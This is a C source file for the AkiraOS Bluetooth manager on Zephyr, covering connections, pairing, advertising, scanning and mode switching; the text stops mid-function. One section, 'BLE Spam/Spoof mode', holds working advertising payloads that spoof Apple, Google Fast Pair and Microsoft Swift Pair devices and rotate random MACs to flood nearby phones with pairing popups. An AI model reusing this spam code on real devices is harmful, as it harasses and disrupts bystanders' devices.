/**
 * @file bt_manager.c
 * @brief Bluetooth Manager Implementation for AkiraOS
 */

#include "bt_manager.h"
#include <zephyr/kernel.h>
#include <zephyr/logging/log.h>
#include <string.h>

#if defined(CONFIG_BT)
#include <zephyr/bluetooth/bluetooth.h>
#include <zephyr/bluetooth/conn.h>
#include <zephyr/bluetooth/gatt.h>
#include <zephyr/bluetooth/hci.h>
#include <zephyr/bluetooth/addr.h>
#include <zephyr/settings/settings.h>
#include <zephyr/random/random.h>
#define BT_AVAILABLE 1
#else
#define BT_AVAILABLE 0
#endif

#if defined(CONFIG_AKIRA_BT_ECHO)
#include "bt_echo.h"
#endif

#ifdef CONFIG_BT_BAS
#include <zephyr/bluetooth/services/bas.h>
#endif

#if defined(CONFIG_AKIRA_POWER_MANAGER)
#include <drivers/power/power_manager.h>
#endif

#if defined(CONFIG_AKIRA_WASM_BLE)
#include "ble_app_service.h"
#endif

#if defined(CONFIG_AKIRA_SETTINGS)
#include "../../settings/settings.h"
#endif

#if defined(CONFIG_SHELL)
#include <zephyr/shell/shell.h>
#include <zephyr/sys/reboot.h>
#endif

LOG_MODULE_REGISTER(bt_manager, CONFIG_AKIRA_LOG_LEVEL);

bool bt_manager_boot_mode_is_companion(void)
{
#if defined(CONFIG_AKIRA_BT_COMPANION) && defined(CONFIG_AKIRA_SETTINGS)
    char v[16] = "";
    if (akira_settings_get(AKIRA_BT_MODE_KEY, v, sizeof(v)) == 0 &&
        strcmp(v, "companion") == 0) {
        return true;
    }
#endif
    return false;
}

/*===========================================================================*/
/* Internal State                                                            */
/*===========================================================================*/

static struct
{
    bool initialized;
    bool hid_active;   /**< true when HID was started at boot via SYS_INIT */
    bt_config_t config;
    bt_state_t state;
    bt_stats_t stats;
    bt_manager_mode_t mode;

#if BT_AVAILABLE
    struct bt_conn *current_conn;
    struct k_work_delayable reconnect_work;
    struct k_work_delayable adv_slow_work; /**< switches advertising to slow interval after 30 s */
#if defined(CONFIG_BT_BAS) && defined(CONFIG_AKIRA_POWER_MANAGER)
    struct k_work_delayable bas_update_work; /**< refreshes the GATT Battery Service */
#endif
#endif

    bt_event_callback_t event_cb;
    void *event_cb_data;

    struct k_mutex mutex;
} bt_mgr;

#if BT_AVAILABLE
/* Depth chosen to match the existing GATT event queue's precedent
 * (CONFIG_AKIRA_BLE_EVENT_QUEUE_DEPTH in ble_app_service.c); scan reports
 * are lower-value than GATT events so a fixed constant is fine here. */
#define BLE_SCAN_QUEUE_DEPTH 16
K_MSGQ_DEFINE(g_scan_evt_q, sizeof(struct ble_scan_report), BLE_SCAN_QUEUE_DEPTH, 4);
#endif

/*===========================================================================*/
/* Internal Functions                                                        */
/*===========================================================================*/

static void notify_event(bt_event_t event, void *data)
{
    if (bt_mgr.event_cb)
    {
        bt_mgr.event_cb(event, data, bt_mgr.event_cb_data);
    }
}

#if BT_AVAILABLE

/**
 * @brief Delayed work handler for reconnect advertising
 * 
 * This work item restarts advertising after a configurable delay,
 * giving the phone time to clean up the previous connection.
 */
static void reconnect_work_handler(struct k_work *work)
{
    LOG_INF("Restarting advertising after disconnect delay");

    if (bt_mgr.config.auto_advertise && bt_mgr.state == BT_STATE_READY)
    {
        bt_manager_start_advertising();
    }
}

/* Forward declaration — ad[] is defined later in this file after the callbacks. */
static const struct bt_data ad[];

static void connected_cb(struct bt_conn *conn, uint8_t err)
{
    if (err)
    {
        LOG_ERR("Connection failed (err 0x%02x)", err);
        bt_mgr.state = BT_STATE_READY;
        return;
    }

    bt_mgr.current_conn = bt_conn_ref(conn);
    bt_mgr.state = BT_STATE_CONNECTED;
    bt_mgr.stats.connections++;
    k_work_cancel_delayable(&bt_mgr.adv_slow_work);

    char addr[BT_ADDR_LE_STR_LEN];
    bt_addr_le_to_str(bt_conn_get_dst(conn), addr, sizeof(addr));
    LOG_INF("Connected: %s", addr);

    notify_event(BT_EVENT_CONNECTED, NULL);
#if defined(CONFIG_AKIRA_WASM_BLE)
    if (bt_mgr.mode == BT_MODE_BLE_APP) {
        ble_app_push_conn_event(BLE_EVT_CONNECTED);
    }
#endif
}

static void disconnected_cb(struct bt_conn *conn, uint8_t reason)
{
    char addr[BT_ADDR_LE_STR_LEN];
    bt_addr_le_to_str(bt_conn_get_dst(conn), addr, sizeof(addr));
    LOG_INF("Disconnected: %s (reason 0x%02x)", addr, reason);

    /* Clean up connection reference */
    if (bt_mgr.current_conn)
    {
        bt_conn_unref(bt_mgr.current_conn);
        bt_mgr.current_conn = NULL;
    }

    bt_mgr.state = BT_STATE_READY;
    bt_mgr.stats.disconnections++;

    notify_event(BT_EVENT_DISCONNECTED, NULL);
#if defined(CONFIG_AKIRA_WASM_BLE)
    if (bt_mgr.mode == BT_MODE_BLE_APP) {
        ble_app_push_conn_event(BLE_EVT_DISCONNECTED);
    }
#endif

    /* Cancel any pending reconnect work */
    k_work_cancel_delayable(&bt_mgr.reconnect_work);

    /* Restart advertising with configurable delay to allow phone cleanup */
    if (bt_mgr.config.auto_advertise)
    {
#ifdef CONFIG_BT_RECONNECT_DELAY_MS
        if (CONFIG_BT_RECONNECT_DELAY_MS > 0)
        {
            LOG_INF("Scheduling advertising restart in %d ms", CONFIG_BT_RECONNECT_DELAY_MS);
            k_work_schedule(&bt_mgr.reconnect_work, K_MSEC(CONFIG_BT_RECONNECT_DELAY_MS));
        }
        else
        {
            /* No delay - start advertising immediately */
            bt_manager_start_advertising();
        }
#else
        /* No delay configured - start advertising immediately */
        bt_manager_start_advertising();
#endif
    }

#if defined(CONFIG_AKIRA_BT_ECHO)
    /* Reinitialize echo service for next connection */
    bt_echo_init();
#endif
}

#if defined(CONFIG_BT_SMP)
static void security_changed_cb(struct bt_conn *conn, bt_security_t level,
                                enum bt_security_err err)
{
    char addr[BT_ADDR_LE_STR_LEN];
    bt_addr_le_to_str(bt_conn_get_dst(conn), addr, sizeof(addr));

    if (err)
    {
        LOG_WRN("Security failed: %s level %d err %d", addr, level, err);

        if (err == BT_SECURITY_ERR_AUTH_FAIL || err == BT_SECURITY_ERR_PIN_OR_KEY_MISSING)
        {
            /* Stale bond — LTK no longer matches. Wipe it and force a fresh pair
             * so the peer does not need to manually "Forget Device". */
            LOG_INF("Stale bond for %s — wiping and requesting re-pair", addr);
            bt_unpair(BT_ID_DEFAULT, bt_conn_get_dst(conn));
            bt_conn_set_security(conn, BT_SECURITY_L2 | BT_SECURITY_FORCE_PAIR);
        }
        else if (err == BT_SECURITY_ERR_AUTH_REQUIREMENT)
        {
            if (bt_mgr.mode == BT_MODE_HID)
            {
                /* HID: Windows "Remove device" wiped its LTK but device kept the
                 * stale bond. Windows reconnects fresh with MITM=1 → AUTH_REQUIREMENT.
                 * Wipe our stale bond and force just-works re-pair. */
                LOG_INF("HID stale bond for %s — wiping and re-pairing", addr);
                bt_unpair(BT_ID_DEFAULT, bt_conn_get_dst(conn));
                bt_conn_set_security(conn, BT_SECURITY_L2 | BT_SECURITY_FORCE_PAIR);
            }
            else
            {
                /* Non-HID: BONDABLE=n, no LTK to store — stay at L1. */
                LOG_WRN("Peer %s requires MITM (NoInputNoOutput) — staying at L1", addr);
            }
        }
        return;
    }

    LOG_INF("Security changed: %s level %d", addr, level);

    if (level >= BT_SECURITY_L2)
    {
        bt_mgr.stats.bonded = true;
        notify_event(BT_EVENT_PAIRED, NULL);
    }
}

/* Pairing auth callbacks — NoInputNoOutput IO capability (just-works).
 * pairing_confirm MUST be provided and call bt_conn_auth_pairing_confirm()
 * otherwise Zephyr leaves the pairing request unanswered and iOS times out
 * showing "Pairing Unsuccessful". */
static void auth_pairing_confirm(struct bt_conn *conn)
{
    char addr[BT_ADDR_LE_STR_LEN];
    bt_addr_le_to_str(bt_conn_get_dst(conn), addr, sizeof(addr));
    LOG_INF("Pairing confirm (just-works): %s — accepting", addr);
    bt_conn_auth_pairing_confirm(conn);
}

static void auth_pairing_complete(struct bt_conn *conn, bool bonded)
{
    char addr[BT_ADDR_LE_STR_LEN];
    bt_addr_le_to_str(bt_conn_get_dst(conn), addr, sizeof(addr));
    LOG_INF("Pairing complete: %s bonded=%d", addr, bonded);
}

static void auth_pairing_failed(struct bt_conn *conn, enum bt_security_err reason)
{
    char addr[BT_ADDR_LE_STR_LEN];
    bt_addr_le_to_str(bt_conn_get_dst(conn), addr, sizeof(addr));
    LOG_WRN("Pairing failed: %s reason %d", addr, reason);
}

static const struct bt_conn_auth_cb auth_callbacks = {
    .pairing_confirm = auth_pairing_confirm,
};

static struct bt_conn_auth_info_cb auth_info_callbacks = {
    .pairing_complete = auth_pairing_complete,
    .pairing_failed   = auth_pairing_failed,
};
#endif /* CONFIG_BT_SMP || CONFIG_BT_CLASSIC */

static struct bt_conn_cb conn_callbacks = {
    .connected = connected_cb,
    .disconnected = disconnected_cb,
#if defined(CONFIG_BT_SMP) || defined(CONFIG_BT_CLASSIC)
    .security_changed = security_changed_cb,
#endif
};

/* Advertising data */
static const struct bt_data ad[] = {
    BT_DATA_BYTES(BT_DATA_FLAGS, (BT_LE_AD_GENERAL | BT_LE_AD_NO_BREDR)),
#if CONFIG_AKIRA_HID_MODE_KB_MOUSE
    BT_DATA_BYTES(BT_DATA_GAP_APPEARANCE,
                BT_BYTES_LIST_LE16(0x03C1)), /* Keyboard */
#elif CONFIG_AKIRA_HID_MODE_GAMEPAD
    BT_DATA_BYTES(BT_DATA_GAP_APPEARANCE,
                BT_BYTES_LIST_LE16(0x03C3)), /* Joystick */
#endif
#ifdef CONFIG_AKIRA_BT_HID
    BT_DATA_BYTES(BT_DATA_UUID16_ALL,
                  BT_UUID_16_ENCODE(BT_UUID_HIDS_VAL),
                  BT_UUID_16_ENCODE(BT_UUID_BAS_VAL)),
#endif
};

/* Fires 30 s after advertising starts — switches to slow interval to save
 * power while remaining discoverable.  Fast interval kept for the first 30 s
 * so pairing from a phone is snappy out of the box. */
static void adv_slow_work_handler(struct k_work *work)
{
    ARG_UNUSED(work);
    if (bt_mgr.state != BT_STATE_ADVERTISING)
    {
        return;
    }
    LOG_INF("BLE: switching to low-power advertising interval");

    static const struct bt_le_adv_param slow = BT_LE_ADV_PARAM_INIT(
        BT_LE_ADV_OPT_CONN,
        BT_GAP_ADV_SLOW_INT_MIN,
        BT_GAP_ADV_SLOW_INT_MAX,
        NULL);

    struct bt_data sd = BT_DATA(BT_DATA_NAME_COMPLETE,
                                bt_mgr.config.device_name,
                                strlen(bt_mgr.config.device_name));
    bt_le_adv_stop();
    int err = bt_le_adv_start(&slow, ad, ARRAY_SIZE(ad), &sd, 1);
    if (err && err != -EALREADY)
    {
        LOG_WRN("BLE slow-adv restart failed (%d)", err);
    }
}

#if defined(CONFIG_BT_BAS) && defined(CONFIG_AKIRA_POWER_MANAGER)
#define BAS_UPDATE_INTERVAL_S 60

/* Keeps the GATT Battery Service in step with the real gauge.  Runs at a lazy
 * 60 s and only writes on change: bt_bas_set_battery_level() notifies every
 * subscribed peer, so a per-second update would spend radio energy to tell the
 * host something it already knows.  On -ENODEV (no gauge fitted, or the gauge
 * is not responding) the seeded value is left alone — better a stale 100 %,
 * which HOGP requires to be valid, than a fabricated reading. */
static void bas_update_work_handler(struct k_work *work)
{
    ARG_UNUSED(work);

    uint8_t pct = 0;
    if (akira_pm_get_battery_level(&pct) == 0)
    {
        if (pct != bt_bas_get_battery_level())
        {
            bt_bas_set_battery_level(pct);
        }
    }

    k_work_schedule(&bt_mgr.bas_update_work, K_SECONDS(BAS_UPDATE_INTERVAL_S));
}
#endif /* CONFIG_BT_BAS && CONFIG_AKIRA_POWER_MANAGER */

#endif /* BT_AVAILABLE */

/*===========================================================================*/
/* Public API                                                                */
/*===========================================================================*/

int bt_manager_init(const bt_config_t *config)
{
    if (bt_mgr.initialized)
    {
        return 0;
    }

    LOG_INF("Initializing Bluetooth manager");

    k_mutex_init(&bt_mgr.mutex);
    memset(&bt_mgr.stats, 0, sizeof(bt_stats_t));

    /* Apply configuration */
    if (config)
    {
        memcpy(&bt_mgr.config, config, sizeof(bt_config_t));
    }
    else
    {
        bt_mgr.config.device_name = CONFIG_BT_DEVICE_NAME;
        bt_mgr.config.vendor_id = 0x303A; /* Espressif VID */
        bt_mgr.config.product_id = 0x8363; /* PenEngineering S.R.L - AkiraConsole */
        bt_mgr.config.services = BT_SERVICE_ALL;
        bt_mgr.config.auto_advertise = true;
        bt_mgr.config.pairable = true;
    }

    bt_mgr.state = BT_STATE_INITIALIZING;

#if BT_AVAILABLE
    k_work_init_delayable(&bt_mgr.reconnect_work, reconnect_work_handler);
    k_work_init_delayable(&bt_mgr.adv_slow_work, adv_slow_work_handler);
#if defined(CONFIG_BT_BAS) && defined(CONFIG_AKIRA_POWER_MANAGER)
    k_work_init_delayable(&bt_mgr.bas_update_work, bas_update_work_handler);
#endif

#if defined(CONFIG_AKIRA_BT_ECHO)
    bt_echo_init();
#endif
    
    int err = bt_enable(NULL);
    if (err)
    {
        LOG_ERR("Bluetooth init failed (err %d)", err);
        bt_mgr.state = BT_STATE_ERROR;
        return err;
    }

    /* Load stored bonds */
    if (IS_ENABLED(CONFIG_SETTINGS))
    {
        LOG_INF("Loaded BT settings");
        settings_load();
    }

#ifdef CONFIG_BT_BAS
    /* HOGP mandates Battery Service and the value must be valid before HID
     * enumeration completes, so seed 100 % here — but do not leave it there.
     * bas_update_work replaces it with the real reading as soon as one is
     * available, and keeps it current from then on. */
    bt_bas_set_battery_level(100);
#if defined(CONFIG_AKIRA_POWER_MANAGER)
    k_work_schedule(&bt_mgr.bas_update_work, K_SECONDS(BAS_UPDATE_INTERVAL_S));
#endif
#endif

    bt_conn_cb_register(&conn_callbacks);

#if defined(CONFIG_BT_SMP) || defined(CONFIG_BT_CLASSIC)
    bt_conn_auth_cb_register(&auth_callbacks);
    bt_conn_auth_info_cb_register(&auth_info_callbacks);
#endif

    bt_mgr.state = BT_STATE_READY;
    bt_mgr.initialized = true;

    LOG_INF("Bluetooth initialized: %s", bt_mgr.config.device_name);

    notify_event(BT_EVENT_READY, NULL);

    if (bt_mgr.config.auto_advertise)
    {
        bt_manager_start_advertising();
    }

    return 0;
#else
    LOG_WRN("Bluetooth not available on this platform (simulation mode)");
    bt_mgr.state = BT_STATE_READY;
    bt_mgr.initialized = true;
    return 0;
#endif
}

int bt_manager_deinit(void)
{
    if (!bt_mgr.initialized)
    {
        return 0;
    }

    bt_manager_disconnect();
    bt_manager_stop_advertising();

    bt_mgr.initialized = false;
    bt_mgr.state = BT_STATE_OFF;

    LOG_INF("Bluetooth manager deinitialized");
    return 0;
}

int bt_manager_start_advertising(void)
{
#if BT_AVAILABLE
    if (!bt_mgr.initialized)
    {
        return -EINVAL;
    }

    if (bt_mgr.state == BT_STATE_CONNECTED)
    {
        return -EBUSY;
    }

    /* Fast intervals for first 30 s so pairing is snappy.
     * adv_slow_work switches to 1000-1200 ms after that to save power. */
    struct bt_le_adv_param adv_param = BT_LE_ADV_PARAM_INIT(
        BT_LE_ADV_OPT_CONN,
        BT_GAP_ADV_FAST_INT_MIN_2,
        BT_GAP_ADV_FAST_INT_MAX_2,
        NULL);

    struct bt_data sd[] = {
        BT_DATA(BT_DATA_NAME_COMPLETE, bt_mgr.config.device_name,
                strlen(bt_mgr.config.device_name)),
    };

    int err = bt_le_adv_start(&adv_param, ad, ARRAY_SIZE(ad), sd, ARRAY_SIZE(sd));
    if (err == -EALREADY)
    {
        LOG_INF("BT already advertising!");
        return err;
    }
    else if (err)
    {
        LOG_ERR("Advertising start failed (err %d)", err);
        return err;
    }

    bt_mgr.state = BT_STATE_ADVERTISING;
    k_work_schedule(&bt_mgr.adv_slow_work, K_SECONDS(30));
    LOG_INF("BLE advertising started (fast -> slow in 30 s)");
    return 0;
#else
    LOG_INF("Bluetooth advertising (simulated)");
    bt_mgr.state = BT_STATE_ADVERTISING;
    return 0;
#endif
}

int bt_manager_stop_advertising(void)
{
#if BT_AVAILABLE
    if (bt_mgr.state == BT_STATE_ADVERTISING)
    {
        k_work_cancel_delayable(&bt_mgr.adv_slow_work);
        bt_le_adv_stop();
        bt_mgr.state = BT_STATE_READY;
        LOG_INF("Bluetooth advertising stopped");
    }
    return 0;
#else
    bt_mgr.state = BT_STATE_READY;
    return 0;
#endif
}

int bt_manager_disconnect(void)
{
#if BT_AVAILABLE
    if (bt_mgr.current_conn)
    {
        bt_conn_disconnect(bt_mgr.current_conn, BT_HCI_ERR_REMOTE_USER_TERM_CONN);
    }
    return 0;
#else
    bt_mgr.state = BT_STATE_READY;
    notify_event(BT_EVENT_DISCONNECTED, NULL);
    return 0;
#endif
}

bt_state_t bt_manager_get_state(void)
{
    return bt_mgr.state;
}

int bt_manager_get_stats(bt_stats_t *stats)
{
    if (!stats)
    {
        return -EINVAL;
    }

    k_mutex_lock(&bt_mgr.mutex, K_FOREVER);
    memcpy(stats, &bt_mgr.stats, sizeof(bt_stats_t));
    stats->state = bt_mgr.state;
    k_mutex_unlock(&bt_mgr.mutex);

    return 0;
}

bool bt_manager_is_connected(void)
{
    return bt_mgr.state == BT_STATE_CONNECTED;
}

int bt_manager_conn_params_idle(void)
{
#if BT_AVAILABLE
    /* ref before use: disconnected_cb() can NULL/unref current_conn concurrently */
    struct bt_conn *conn = bt_mgr.current_conn;
    if (!conn) return 0;
    conn = bt_conn_ref(conn);
    if (!conn) return 0;

    /* interval 640..800*1.25ms=800..1000ms, latency 4, timeout 1200*10ms=12000ms
     * (>2*(1+4)*1000=10000, holds) */
    int err = bt_conn_le_param_update(conn, BT_LE_CONN_PARAM(640, 800, 4, 1200));
    if (err) LOG_WRN("Idle conn param update rejected (err %d)", err);
    bt_conn_unref(conn);
    return 0;
#else
    return 0;
#endif
}

int bt_manager_conn_params_active(void)
{
#if BT_AVAILABLE
    struct bt_conn *conn = bt_mgr.current_conn;
    if (!conn) return 0;
    conn = bt_conn_ref(conn);
    if (!conn) return 0;

    /* interval 12..24*1.25ms=15..30ms, latency 0, timeout 400*10ms=4000ms (holds) */
    int err = bt_conn_le_param_update(conn, BT_LE_CONN_PARAM(12, 24, 0, 400));
    bt_conn_unref(conn);
    if (err) LOG_WRN("Active conn param update rejected (err %d)", err);
    return 0;
#else
    return 0;
#endif
}

int bt_manager_register_callback(bt_event_callback_t callback, void *user_data)
{
    bt_mgr.event_cb = callback;
    bt_mgr.event_cb_data = user_data;
    return 0;
}

int bt_manager_unpair_all(void)
{
#if BT_AVAILABLE
    int err = bt_unpair(BT_ID_DEFAULT, NULL);
    if (err)
    {
        LOG_ERR("Failed to unpair (err %d)", err);
        return err;
    }
    LOG_INF("All bonds deleted");
    return 0;
#else
    return 0;
#endif
}

int bt_manager_get_address(char *buffer, size_t len)
{
    if (!buffer || len < 18)
    {
        return -EINVAL;
    }

#if BT_AVAILABLE
    bt_addr_le_t addr;
    size_t count = 1;
    bt_id_get(&addr, &count);
    bt_addr_le_to_str(&addr, buffer, len);
    return 0;
#else
    snprintf(buffer, len, "00:00:00:00:00:00");
    return 0;
#endif
}

#if BT_AVAILABLE
/*===========================================================================*/
/* BLE Observer (Scan) mode                                                  */
/*===========================================================================*/

struct scan_parse_ctx {
    char name[BLE_SCAN_NAME_LEN];
};

static bool scan_ad_parse_cb(struct bt_data *data, void *user_data)
{
    struct scan_parse_ctx *ctx = user_data;

    if (data->type == BT_DATA_NAME_COMPLETE || data->type == BT_DATA_NAME_SHORTENED) {
        size_t len = data->data_len;

        if (len > sizeof(ctx->name) - 1) {
            len = sizeof(ctx->name) - 1;
        }
        memcpy(ctx->name, data->data, len);
        ctx->name[len] = '\0';
        return false; /* prefer first/complete name found, stop parsing */
    }
    return true;
}

static void scan_recv_cb(const struct bt_le_scan_recv_info *info,
                          struct net_buf_simple *buf)
{
    struct ble_scan_report rep = {0};
    struct scan_parse_ctx ctx = {0};
    struct net_buf_simple_state state;

    memcpy(rep.addr, info->addr->a.val, BLE_SCAN_ADDR_LEN);
    rep.rssi = info->rssi;

    net_buf_simple_save(buf, &state);
    bt_data_parse(buf, scan_ad_parse_cb, &ctx);
    net_buf_simple_restore(buf, &state);
    memcpy(rep.name, ctx.name, sizeof(rep.name));

    rep.adv_len = (buf->len > sizeof(rep.adv_data)) ? sizeof(rep.adv_data) : buf->len;
    memcpy(rep.adv_data, buf->data, rep.adv_len);

    (void)k_msgq_put(&g_scan_evt_q, &rep, K_NO_WAIT); /* drop on full queue */
}

static struct bt_le_scan_cb scan_callbacks = {
    .recv = scan_recv_cb,
};

int bt_manager_scan_start(bool active)
{
    int ret = bt_manager_set_mode(BT_MODE_BLE_SCAN);

    if (ret < 0) {
        return ret;
    }

    /* A prior scan may still be running — e.g. a WASM app that exited or
     * trapped without calling scan_stop leaves BT_DEV_SCANNING set, which
     * makes bt_le_scan_start() return -EALREADY. Clear it first; the call is
     * harmless (ignored -EALREADY) when nothing is scanning. */
    bt_le_scan_stop();

    k_msgq_purge(&g_scan_evt_q);
    bt_le_scan_cb_register(&scan_callbacks);

    struct bt_le_scan_param param = {
        .type       = active ? BT_LE_SCAN_TYPE_ACTIVE : BT_LE_SCAN_TYPE_PASSIVE,
        .options    = BT_LE_SCAN_OPT_FILTER_DUPLICATE,
        .interval   = BT_GAP_SCAN_FAST_INTERVAL,
        .window     = BT_GAP_SCAN_FAST_WINDOW,
    };

    int err = bt_le_scan_start(&param, NULL);

    if (err) {
        LOG_ERR("bt_manager_scan_start: bt_le_scan_start failed: %d", err);
        bt_le_scan_cb_unregister(&scan_callbacks);
        bt_manager_set_mode(BT_MODE_NONE);
        return err;
    }

    LOG_INF("BLE scan started (active=%d)", active);
    return 0;
}

int bt_manager_scan_stop(void)
{
    bt_le_scan_stop();
    bt_le_scan_cb_unregister(&scan_callbacks);
    bt_manager_set_mode(BT_MODE_NONE);
    LOG_INF("BLE scan stopped");
    return 0;
}

int bt_manager_scan_pop(struct ble_scan_report *out)
{
    if (!out) {
        return -EINVAL;
    }
    if (k_msgq_get(&g_scan_evt_q, out, K_NO_WAIT) == 0) {
        return 1;
    }
    return 0;
}
#else /* !BT_AVAILABLE */
int bt_manager_scan_start(bool active) { (void)active; return -ENOTSUP; }
int bt_manager_scan_stop(void) { return -ENOTSUP; }
int bt_manager_scan_pop(struct ble_scan_report *out) { (void)out; return -ENOTSUP; }
#endif /* BT_AVAILABLE */

#if BT_AVAILABLE
/*===========================================================================*/
/* BLE Spam/Spoof mode                                                       */
/*===========================================================================*/

/* Advertising payload turnover rate — fast enough to be visibly "spammy"
 * on a nearby scanner, slow enough not to starve the BT controller. */
#define BLE_SPAM_ADV_INTERVAL_MS 200

/* Manufacturer-data length for the random-flood preset. Arbitrary but
 * fixed, named so the randomization loop bound isn't a bare literal. */
#define BLE_SPAM_RANDOM_MFG_LEN 26

/* Apple Continuity proximity-pair popup trigger (AirPods-style).
 * AD type 0xFF (manufacturer data), Apple company ID 0x004C,
 * type byte 0x07 (proximity pairing), minimal AirPods-shape payload. */
static const uint8_t spam_apple_payload[] = {
    0x4C, 0x00, 0x07, 0x19, 0x01, 0x0E, 0x20, 0x75,
    0x00, 0x0A, 0x50, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x45, 0x12, 0x00, 0x00, 0x00, 0x00,
};

/* Google Fast Pair — service UUID 0xFE2C with a placeholder model ID.
 * Real devices key this to a registered model ID; using a public example
 * ID is sufficient to trigger the Fast Pair scan UI on Android. */
static const uint8_t spam_fastpair_payload[] = {
    0x2C, 0xFE, 0x41, 0x00, 0x92,
};

/* Microsoft Swift Pair — AD type 0x06, Microsoft beacon subtype 0x03. */
static const uint8_t spam_swiftpair_payload[] = {
    0x06, 0x00, 0x03, 0x00, 0x80,
};

static struct k_work_delayable spam_work;
static int spam_preset;
static uint32_t spam_packet_count;
static bool spam_work_initialized;

static void spam_work_handler(struct k_work *work)
{
    ARG_UNUSED(work);

    /* USE_NRPA: fresh non-resolvable random MAC per advertisement. Targets
     * dedup pairing popups by advertiser MAC, so a fixed identity address
     * would fire the popup once then go silent; NRPA keeps it "spammy" and
     * avoids leaking the console's real identity MAC to nearby scanners. */
    struct bt_le_adv_param adv_param = BT_LE_ADV_PARAM_INIT(
        BT_LE_ADV_OPT_USE_NRPA,
        BT_GAP_ADV_FAST_INT_MIN_2,
        BT_GAP_ADV_FAST_INT_MAX_2,
        NULL);

    uint8_t mfg_buf[BLE_SPAM_RANDOM_MFG_LEN];
    struct bt_data ad[1];

    switch (spam_preset) {
    case BLE_SPAM_PRESET_APPLE:
        ad[0] = (struct bt_data)BT_DATA(BT_DATA_MANUFACTURER_DATA,
                                         spam_apple_payload, sizeof(spam_apple_payload));
        break;
    case BLE_SPAM_PRESET_FASTPAIR:
        ad[0] = (struct bt_data)BT_DATA(BT_DATA_SVC_DATA16,
                                         spam_fastpair_payload, sizeof(spam_fastpair_payload));
        break;
    case BLE_SPAM_PRESET_SWIFTPAIR:
        ad[0] = (struct bt_data)BT_DATA(BT_DATA_MANUFACTURER_DATA,
                                         spam_swiftpair_payload, sizeof(spam_swiftpair_payload));
        break;
    case BLE_SPAM_PRESET_RANDOM:
    default:
        mfg_buf[0] = 0xFF; /* company ID low byte, randomized below */
        mfg_buf[1] = 0xFF;
        for (size_t i = 2; i < sizeof(mfg_buf); i++) {
            mfg_buf[i] = (uint8_t)sys_rand32_get();
        }
        ad[0] = (struct bt_data)BT_DATA(BT_DATA_MANUFACTURER_DATA,
                                         mfg_buf, sizeof(mfg_buf));
        break;
    }

    bt_le_adv_stop();
    int err = bt_le_adv_start(&adv_param, ad, ARRAY_SIZE(ad), NULL, 0);

    if (err) {
        LOG_WRN("spam_work: adv_start failed: %d", err);
    } else {
        spam_packet_count++;
    }

    if (bt_mgr.mode == BT_MODE_BLE_SPAM) {
        k_work_schedule(&spam_work, K_MSEC(BLE_SPAM_ADV_INTERVAL_MS));
    }
}

int bt_manager_spam_start(int preset)
{
    if (preset < BLE_SPAM_PRESET_APPLE || preset > BLE_SPAM_PRESET_RANDOM) {
        return -EINVAL;
    }

    int ret = bt_manager_set_mode(BT_MODE_BLE_SPAM);

    if (ret < 0) {
        return ret;
    }

    spam_preset = preset;
    spam_packet_count = 0;
    if (!spam_work_initialized) {
        k_work_init_delayable(&spam_work, spam_work_handler);
        spam_work_initialized = true;
    }
    k_work_schedule(&spam_work, K_NO_WAIT);

    LOG_INF("BLE spam started (preset=%d)", preset);
    return 0;
}

int bt_manager_spam_stop(void)
{
    struct k_work_sync sync;

    k_work_cancel_delayable_sync(&spam_work, &sync);
    bt_le_adv_stop();
    bt_manager_set_mode(BT_MODE_NONE);
    LOG_INF("BLE spam stopped (%u packets sent)", spam_packet_count);
    return 0;
}

uint32_t bt_manager_spam_packet_count(void)
{
    return spam_packet_count;
}
#else /* !BT_AVAILABLE */
int bt_manager_spam_start(int preset) { (void)preset; return -ENOTSUP; }
int bt_manager_spam_stop(void) { return -ENOTSUP; }
uint32_t bt_manager_spam_packet_count(void) { return 0; }
#endif /* BT_AVAILABLE */

/*===========================================================================*/
/* Mode Switch                                                               */
/*===========================================================================*/

int bt_manager_set_mode(bt_manager_mode_t mode)
{
    k_mutex_lock(&bt_mgr.mutex, K_FOREVER);

    if (mode != BT_MODE_NONE && bt_mgr.mode != BT_MODE_NONE && bt_mgr.mode != mode) {
        if ((bt_mgr.mode == BT_MODE_HID && mode == BT_MODE_BLE_APP) ||
            (bt_mgr.mode == BT_MODE_BLE_APP && mode == BT_MODE_HID) ||
            (bt_mgr.mode == BT_MODE_HID && mode == BT_MODE_BLE_SCAN) ||
            (bt_mgr.mode == BT_MODE_HID && mode == BT_MODE_BLE_SPAM) ||
            (mode == BT_MODE_MESH && bt_mgr.mode != BT_MODE_BLE_SCAN) ||
            (bt_mgr.mode == BT_MODE_MESH && mode != BT_MODE_BLE_SCAN)) {
            LOG_INF("BT: mode %d sharing stack with mode %d", bt_mgr.mode, mode);
        } else if ((bt_mgr.mode == BT_MODE_HID && mode == BT_MODE_COMPANION) ||
                   (bt_mgr.mode == BT_MODE_COMPANION && mode == BT_MODE_HID)) {
            /* HID and Companion are exclusive but may be swapped at boot before
             * any connection exists. Drop the current advertising so the new
             * mode can start its own. */
            LOG_INF("BT: switching BLE mode %d -> %d (takeover)", bt_mgr.mode, mode);
            bt_manager_stop_advertising();
        } else {
            k_mutex_unlock(&bt_mgr.mutex);
            LOG_ERR("BT mode conflict: active=%d requested=%d", bt_mgr.mode, mode);
            return -EBUSY;
        }
    }

    /* When HID was started at boot, releasing to NONE restores it */
    if (mode == BT_MODE_NONE && bt_mgr.hid_active) {
        bt_mgr.mode = BT_MODE_HID;
    } else {
        bt_mgr.mode = mode;
    }
    k_mutex_unlock(&bt_mgr.mutex);

    /* Lazy init when transitioning out of NONE and not yet initialized */
    if (mode != BT_MODE_NONE && !bt_mgr.initialized) {
        bt_config_t lazy_cfg = {
            .device_name    = CONFIG_BT_DEVICE_NAME,
            .auto_advertise = false,
            .pairable       = true,
        };
        return bt_manager_init(&lazy_cfg);
    }

    LOG_INF("BT mode set to %d", mode);
    return 0;
}

bt_manager_mode_t bt_manager_get_mode(void)
{
    return bt_mgr.mode;
}

/*===========================================================================*/
/* Custom Advertising (BLE_APP mode)                                        */
/*===========================================================================*/

int bt_manager_start_advertising_custom(const uint8_t svc_uuid128[16])
{
#if BT_AVAILABLE
    if (!bt_mgr.initialized) {
        return -EINVAL;
    }
    if (bt_mgr.state == BT_STATE_CONNECTED) {
        return -EBUSY;
    }

    struct bt_le_adv_param adv_param = BT_LE_ADV_PARAM_INIT(
        BT_LE_ADV_OPT_CONN,
        BT_GAP_ADV_FAST_INT_MIN_2,
        BT_GAP_ADV_FAST_INT_MAX_2,
        NULL);

    /* Flags only in advert payload — keeps it minimal */
    struct bt_data custom_ad[] = {
